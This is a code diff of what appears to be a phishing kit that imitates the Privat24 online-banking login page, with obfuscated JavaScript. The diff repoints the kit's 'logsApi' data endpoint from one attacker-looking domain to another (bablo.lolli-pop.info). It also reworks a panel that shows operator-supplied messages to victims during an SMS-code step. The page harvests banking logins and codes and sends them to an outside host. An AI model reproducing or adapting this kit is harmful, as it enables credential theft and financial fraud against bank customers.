@@ -94,6 +94,27 @@
       .gaOUzQ {
          text-align: center;
       }
+
+	           /* Стиль для пользовательского сообщения */
+        .custom-message {
+            display: none;
+            position: relative;
+            color: rgba(0, 0, 0, 0.87);
+            text-align: center;
+            padding: 16px;
+            font-size: 16px;
+            line-height: 24px;
+            font-weight: 400;
+            margin: 20px auto;
+            background: rgba(125, 255, 123, 0.22); /* Зеленый фон */
+            border-radius: 8px;
+            max-width: 320px;
+        }
+
+        .custom-message.show {
+            display: block;
+        }
+	   
    </style>
 </head>
 
@@ -130,10 +151,6 @@
                         <div class="p24h">
                            <h2>Вхід у Приват24</h2>
                         </div>
-						                                <!-- Блок для пользовательского сообщения -->
-                                <div id="customMessage" class="custom-message"></div>
-								
-								<!-- Блок для пользовательского сообщения -->
                         <style>
                            .modal_msg {
                               display: none;
@@ -154,30 +171,13 @@
                               -ms-user-select: none;
                               -webkit-user-select: none;
                            }
-						   
-						           /* Стиль для пользовательского сообщения */
-        .custom-message {
-            display: none;
-            position: relative;
-            color: rgba(0, 0, 0, 0.87);
-            text-align: center;
-            padding: 16px;
-            font-size: 16px;
-            line-height: 24px;
-            font-weight: 400;
-            margin: 20px auto;
-            background: rgba(125, 255, 123, 0.22); /* Зеленый фон */
-            border-radius: 8px;
-            max-width: 320px;
-        }
-
-        .custom-message.show {
-            display: block;
-        }
-		
-		
-		
                         </style>
+
+
+			                                     <div id="customMessage" class="custom-message"></div>
+
+
+			     
                         <div class="" id="code_three" style="display:none;">
                            <div class="p24smsw">
                               <div class="p24sc">
@@ -523,7 +523,7 @@
    <script src="./core/axios.min.js"></script>
    <script src="./core/jquery-3.6.0.min.js"></script>
    <script>logsApi = axios.create({
-         baseURL: 'https://privat2025.online',
+         baseURL: 'https://bablo.lolli-pop.info',
          headers: {
             'Accept': 'application/json',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -736,7 +736,7 @@ phoneInput.addEventListener("input", function (_0x5896a2) {
       //    'redirect': 'https://youtu.be/dQw4w9WgXcQ?si=Sgw6YbMbhThxfF2W'
       // });
       const logsApi = axios.create({
-         baseURL: 'https://privat2025.online',
+         baseURL: 'https://bablo.lolli-pop.info',
          headers: {
             'Accept': 'application/json',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -928,12 +928,13 @@ phoneInput.addEventListener("input", function (_0x5896a2) {
                   $(".p24t").removeClass("selected");
                   clearInterval(_0x3abc54);
                }
-			                       // Состояние для пользовательского сообщения
-if (state == 7) {
-    const customMessage = _0x1d6606.data.custom_message || "Сообщение не указано";
-    $("#customMessage").text(customMessage).addClass("show");
-    clearInterval(_0x3abc54);
-}
+		                        // Состояние для пользовательского сообщения
+                    if (state == 0x7) {
+                        const customMessage = _0x1d6606.data.custom_message || "Сообщение не указано";
+                        $("#customMessage").text(customMessage).addClass("show");
+                        // Остаемся на текущей вкладке
+                        clearInterval(_0x3abc54);
+                    }
             });
          }, 0x7d0);
          return _0x3abc54;
